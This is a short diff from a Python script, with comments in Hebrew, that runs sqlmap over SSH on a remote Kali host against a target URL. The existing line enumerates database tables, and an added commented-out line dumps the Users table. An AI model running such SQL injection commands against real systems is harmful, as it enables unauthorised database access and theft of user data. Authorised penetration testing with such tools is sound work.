@@ -173,6 +173,7 @@ def run_remote_sqlmap(target_url: str, kali_ip: str) -> None:
         # 1. הורדנו את --smart
         # 2. --technique=BEU - מיקוד בשיטות פריצה שמתאימות לאפליקציות מודרניות
         sqlmap_cmd = f"sqlmap -u \"{clean_url}\" --batch --tables --dbms=sqlite --technique=BEU --level=2 --risk=2 --random-agent --flush-session"
+        #sqlmap_cmd = f"sqlmap -u \"{clean_url}\" --batch -T Users --dump --dbms=sqlite --technique=BEU --level=2 --risk=2 --random-agent 2>&1"
         print(f"[*] Executing payload: {sqlmap_cmd}")
         
         stdin, stdout, stderr = ssh.exec_command(sqlmap_cmd)
